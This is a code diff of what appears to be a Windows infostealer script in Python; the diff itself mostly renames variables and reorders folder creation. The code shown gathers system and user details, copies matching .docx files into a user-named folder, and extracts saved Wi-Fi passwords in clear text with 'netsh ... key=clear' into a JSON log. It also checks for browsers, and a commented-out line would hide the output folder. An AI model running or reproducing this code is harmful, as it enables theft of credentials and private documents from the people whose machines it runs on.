@@ -19,14 +19,13 @@ try:
 		lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
 		typeos = platform.system() + " " + platform.release()
 		timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-		date = datetime.datetime.now().strftime("%d-%m-%Y")
-		time = datetime.datetime.now().strftime("%H:%M:%S")
+		time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
 		user = getpass.getuser()
 		hostname = socket.gethostname()
 		path = os.getcwd()
 		lip = socket.gethostbyname(socket.gethostname())
 		timedate = "{~} " + timedate
-
+		dirname = user + "_" + time
 
 		print("""
 	 ___      ___   __     __   ___   _______        __      
@@ -44,15 +43,10 @@ try:
 		print("	hostname: ", hostname)
 		print(" 	username: ", user)
 		print(" 	local ip: ", lip)
-
-		time = time.replace(":", "-", 2)
-		dirname = user + "_" + time
 		
-		os.makedirs(path + "\\" + dirname)
 		dio = path + "\\" + dirname
-
+		os.makedirs(dio)
 		os.makedirs(dio + "\\Documents")
-		result = 0
 		def find(pattern, path, pok):
 			global result
 			result = 0
@@ -61,8 +55,8 @@ try:
 				for name in files:
 					if fnmatch.fnmatch(name, pattern):
 						try:
-							file = os.path.join(root, name)
-							copyfile(file, dio + pok + name)
+							fileg = os.path.join(root, name)
+							copyfile(fileg, dio + pok + name)
 							result += 1
 						except shutil.SameFileError:
 							duplicate += 1
@@ -81,9 +75,9 @@ try:
 		print(" 	{~} found .docx: ", ressw)
 
 		def logs():
-			global fileg
-			fileg = open(dio + "\\" + user + "-log" + ".json", "w")
-			fileg.write(
+			global logfile
+			logfile = open(dio + "\\" + user + "-log" + ".json", "w")
+			logfile.write(
 			"""
 	 ___      ___   __     __   ___   _______        __      
 	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
@@ -107,7 +101,7 @@ try:
 		def networkpass(one, two):
 			cost = 0
 			prefix = "{~}"
-			fileg.write("Wi-Fi's [\n")
+			logfile.write("Wi-Fi's [\n")
 
 			data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1125').split('\n')
 			profiles = [i.split(":")[1][1:-1] for i in data if one in i]
@@ -116,12 +110,12 @@ try:
 				results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp1125').split('\n')
 				results = [b.split(":")[1][1:-1] for b in results if two in b]
 				try:
-					fileg.write("		{0}:{1}\n".format(i, results[0]))
+					logfile.write("		{0}:{1}\n".format(i, results[0]))
 					cost += 1
 				except IndexError:
-					fileg.write("		{0}:{1}\n".format(i, ""))
+					logfile.write("		{0}:{1}\n".format(i, ""))
 
-			fileg.write("	]")
+			logfile.write("	]")
 			print(" 	{0} found {1} network/s password/s".format(prefix, cost))
 
 		if lang == "en_US":
@@ -293,7 +287,7 @@ try:
 					print(" 	{+} CocCoc")	
 		browsers()
 		print(")")
-		fileg.write("\n)")
+		logfile.write("\n)")
 		#ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
 		#os.system("cls")
 except KeyboardInterrupt:
